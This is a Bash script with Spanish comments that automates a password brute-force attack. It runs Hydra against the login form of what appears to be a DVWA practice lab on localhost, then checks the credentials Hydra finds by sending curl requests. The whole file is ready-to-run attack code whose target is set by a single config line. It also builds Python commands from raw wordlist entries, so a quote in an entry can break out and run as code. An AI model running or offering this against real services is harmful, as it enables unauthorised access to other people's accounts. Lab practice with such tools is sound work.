#!/usr/bin/env bash
# hydra_brute_verify.sh (corregido)
set -euo pipefail

# ---------- CONFIG ----------
TARGET="127.0.0.1"
PORT="8080"
USERFILE="users.txt"
PASSFILE="passwords.txt"
HYDRA_OUT="hydra_out.txt"
VERIFY_TIMEOUT=5
SLEEP_BETWEEN=0.25

# CORRECCIÓN: Formato correcto PATH:PARAMS:FAIL_STRING
HYDRA_MODULE="/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect"
VERIFY_URL="http://${TARGET}:${PORT}/vulnerabilities/brute/"

# ---------- END CONFIG ----------

# checks
command -v hydra >/dev/null 2>&1 || { echo "ERROR: hydra no está instalado"; exit 1; }
command -v curl >/dev/null 2>&1 || { echo "ERROR: curl no está instalado"; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "ERROR: python3 no está instalado"; exit 1; }
[ -f "$USERFILE" ] || { echo "ERROR: $USERFILE no existe"; exit 1; }
[ -f "$PASSFILE" ] || { echo "ERROR: $PASSFILE no existe"; exit 1; }

echo "[*] Ejecutando Hydra (salida: $HYDRA_OUT). Esto puede tardar..."
hydra -s "$PORT" -L "$USERFILE" -P "$PASSFILE" "$TARGET" \
  http-get-form "$HYDRA_MODULE" \
  -o "$HYDRA_OUT" -t 4 -V -f

echo
echo "[*] Hydra terminó. Extrayendo candidatos..."
grep -E "\[.*\]\[http-.*\]" "$HYDRA_OUT" | \
  sed -n 's/.*login: \([^ ]*\).*password: \([^ ]*\).*/\1:\2/p' | \
  uniq > hydra_candidates.txt || true

if [ ! -s hydra_candidates.txt ]; then
  echo "[!] Hydra no reportó credenciales válidas."
  echo "Revisa $HYDRA_OUT"
  exit 0
fi

echo "[*] Candidatos encontrados:"
cat hydra_candidates.txt
echo

echo "[*] Verificando con curl buscando 'Welcome'..."
while IFS=: read -r user pass; do
  tmpbody=$(mktemp)
  
  enc_user=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$user'))")
  enc_pass=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$pass'))")
  
  full_url="${VERIFY_URL}?username=${enc_user}&password=${enc_pass}&Login=Login"
  
  curl -s --connect-timeout $VERIFY_TIMEOUT "$full_url" -o "$tmpbody" || true
  
  if grep -qi 'welcome' "$tmpbody"; then
    echo
    echo ">>> CREDENCIAL VÁLIDA <<<"
    echo "Usuario: $user"
    echo "Password: $pass"
    echo
    grep -i --color=always 'welcome' "$tmpbody" | head -5
    rm -f "$tmpbody"
  else
    echo "[x] $user:$pass -> no válido"
  fi
  
  rm -f "$tmpbody"
  sleep "$SLEEP_BETWEEN"
done < hydra_candidates.txt

echo
echo "[*] Verificación completada"
